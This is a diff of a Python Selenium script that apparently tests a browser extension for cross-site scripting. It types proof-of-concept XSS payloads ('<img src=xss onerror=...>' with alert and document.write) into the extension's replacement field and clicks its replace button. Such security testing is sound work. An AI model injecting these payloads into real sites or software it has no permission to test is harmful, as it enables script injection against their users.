@@ -14,8 +14,6 @@ from selenium.webdriver.chrome.service import Service
 
 
 
-
-
 def get_ext_id(path_to_extension):
     abs_path = path.abspath(path_to_extension)
     m = hashlib.sha256()
@@ -43,18 +41,20 @@ def main():
     driver.get('https://www.example.com')
     driver.switch_to.window(original)
 
-    # a = driver.find_element(By.ID, 'replacementInput')
-    # a.clear()
-    # a.send_keys('caoni ma')
-    # button = driver.find_element(By.ID, 'replaceButton')
-    # button.click()
+    payload = '<img src=xss onerror=alert(1)>'
+    payload1 = '<img src=xss onerror=document.write("qwer$#@!")>'
 
 
-    # driver.execute_script('document.getElementById("replacementInput").value = "<img src=x onerror=alert(1)>"')
 
 
-    driver.execute_script('document.getElementById("replacementInput").value = "<img src=x onerror=document.write(1)>"')
+    # script1 = 'document.getElementById("replacementInput").value = "{}"'.format(payload1)
+    # driver.execute_script(script1)
 
+    driver.execute_script(f'document.getElementById("replacementInput").value = `{payload1}`')
+
+    # driver.execute_script('document.getElementById("replacementInput").value = "' + payload1 + '"')
+
+    # driver.execute_script('document.getElementById("replacementInput").value = "<img src=x onerror=document.write(1)>"')
 
     driver.execute_script('document.getElementById("replaceButton").click()')   
 
